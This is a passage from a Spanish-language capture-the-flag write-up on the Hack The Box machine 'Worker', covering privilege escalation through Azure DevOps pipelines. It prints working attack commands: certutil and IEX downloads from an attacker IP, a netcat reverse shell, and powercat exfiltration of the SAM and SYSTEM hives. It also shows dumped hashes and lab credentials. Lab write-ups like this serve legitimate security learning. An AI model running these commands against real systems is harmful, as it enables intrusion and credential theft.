- master

pool: 'Setup'

steps:
- script: 'certutil.exe -f -urlcache -split http://10.10.14.202:8000/nc.exe c:\Windows\Temp\nc.exe'

- script: 'c:\Windows\Temp\nc.exe 10.10.14.202 4434 -e cmd.exe'

- script: echo Hello, world!
  displayName: 'Run a one-line script'

- script: |
    echo Add other tasks to build, test, and deploy your project.
    echo See https://aka.ms/yaml
  displayName: 'Run a multi-line script'
```

![270pagedevo_rob_piperevshell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_piperevshell.png)

![270pagedevo_rob_revshell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_revshell.png)

Se ejecuta la conexión para subir el binario `nc.exe` yyy tambien entabla la comunicación para generar la reverse Shell... Muestra cancelado, pero `netcat` ya hizo su tarea... El `cancelado` es debido a que la conexión queda abierta como en "espera", entonces deben tener algún tipo de timeout para cancelar la tarea y que no se quede esperando alguna respuesta.

**Tenemos un problema, ¿cuál es?... Nos cierra la conexión :P**

(Básicamente desde la web podría indicarle que me muestre los hashes md5 de cada flag: `user.txt` y `root.txt`, pero quiero tener una Shell como Administrador)

Estuve mucho tiempo dándole, intentando, quemándome la cabeza, cambiando cosas, creando branches, etc. :') Pero no logre ejecutar la reverse Shell, intente:

* con **PowerShell** (en YAML `- powershell: ...` y junto a `- script: powershell ...`
* tambien `/c` para que apenas ejecute el comando, cierre el proceso, más no la conexión.
* en algunos sitios indicaban ponerle `&` al final de la línea para hacer que la tarea se corra de fondo.
* YAML tiene unos argumentos enfocados a tareas (`jobs`), tambien intente con ellos pero nada.
* Con `start` y `start /B` para ejecutar el comando y mantenerlo en el background.

Nada de nada.

Pensé en transferirme los hashes `SAM` y `SYSTEM` para posteriormente dumpearlos con `pwdump` y después usar `pth-winexe` para ingresar a la máquina con el usuario Administrator. Pero después de todo el proceso, los hashes presuntamente estaban mal y el `pth-winexe` no me daba ningún output. En breves pasos lo que hice fue:

```yml
trigger:
- master

pool: 'Setup'

steps:
#Guardamos registros en archivos:
- script: reg save HKLM\SAM c:\Windows\Temp\sam
- script: reg save HKLM\SYSTEM c:\Windows\Temp\system

#Los transferimos a nuestra maquina: (Levantamos un servidor con python y nos ponemos en escucha por dos puertos [nc -lvp 4435 > sam])
#Buscando y preguntando encontre esta linda herramienta (powercat):
- script: powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.202:8000/powercat.ps1');powercat -c 10.10.14.202 -p 4435 -i c:\Windows\Temp\sam"
- script: powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.202:8000/powercat.ps1');powercat -c 10.10.14.202 -p 4436 -i c:\Windows\Temp\system"

#Tuvimos que ejecutar cada powercat en un pipeline diferente, el timeout no dejaba pasar de uno a otro.
```

Con los archivos en nuestra maquina hacemos:

```bash
–» pwdump sam system
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
aaralf:1019:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
abrall:1020:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
aceals:1021:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
```

Todos son iguales (?) (:

...

En este punto no sabría como obtener una Shell como el usuario `nt autority\system`.

Probemos a crear un usuario y lo asignamos al grupo administradores mediante la web. (Tambien podemos entrar a la máquina mediante el puerto WinRM (5895) con el usuario `robisl`).

```bash
–» evil-winrm -i 10.10.10.203 -u 'robisl' -p 'wolves11' 

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\robisl\Documents> whoami;hostname
worker\robisl
Worker
```

Ahora sí, intentemos agregar el usuario (: Si no me deja, podríamos agregar a `robisl` al grupo de Administradores, pero esa idea no me gusta, igual al final les dejaría la línea que deberíamos ejecutar).

![270pagedevo_rob_createuseryml](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createuseryml.png)

* carlitosway : casl0$3lw@y 

> (Me di cuenta que puse caslos :P)

![270pagedevo_rob_createuserdone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createuserdone.png)

```powershell
*Evil-WinRM* PS C:\Users\robisl\Documents> net user carlitosway
User name                    carlitosway
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-12-03 01:09:07
Password expires             2021-01-14 01:09:07
Password changeable          2020-12-03 01:09:07
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None

*Evil-WinRM* PS C:\Users\robisl\Documents> 
```

Listo, ahora lo agregamos al grupo de administradores.

![270pagedevo_rob_addusergroup](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_addusergroup.png)

**Save and run** > **Save and run**:

```powershell
*Evil-WinRM* PS C:\Users\robisl\Documents> net user carlitosway
User name                    carlitosway
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-12-03 01:09:07
Password expires             2021-01-14 01:09:07
Password changeable          2020-12-03 01:09:07
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None

*Evil-WinRM* PS C:\Users\robisl\Documents> 
```

Yyyyy

```bash
–» evil-winrm -i 10.10.10.203 -u 'carlitosway' -p 'casl0$3lw@y' 

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\carlitosway\Documents> whoami
worker\carlitosway
*Evil-WinRM* PS C:\Users\carlitosway\Documents> ls c:\Users\Administrator\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/2/2020   6:26 PM             34 root.txt


*Evil-WinRM* PS C:\Users\carlitosway\Documents>
```

Perfectooooooooooooooooooooooooooooooooooooooo. Somos administradores del sistemaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (: Que lindooooooooooooooo... 

Lo unico que nos queda es ver las flags:

![270flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270flags.png)

...

Que locura de máquina, muy linda, me gusto mucho el jugar con repositorios, branch y usuarios así, lindo. Hubo dos momentos en que me destruí, ya que no sabía hacia donde mirar, pero bueno, se sobrepasaron los problemas y logramos rootearla. El poder ejecutar comandos tan fácil y como administradores da mucho que pensar, ¿no?... ¿no o.O?

Muchas gracias por leer y a seguir rompiendo todo (: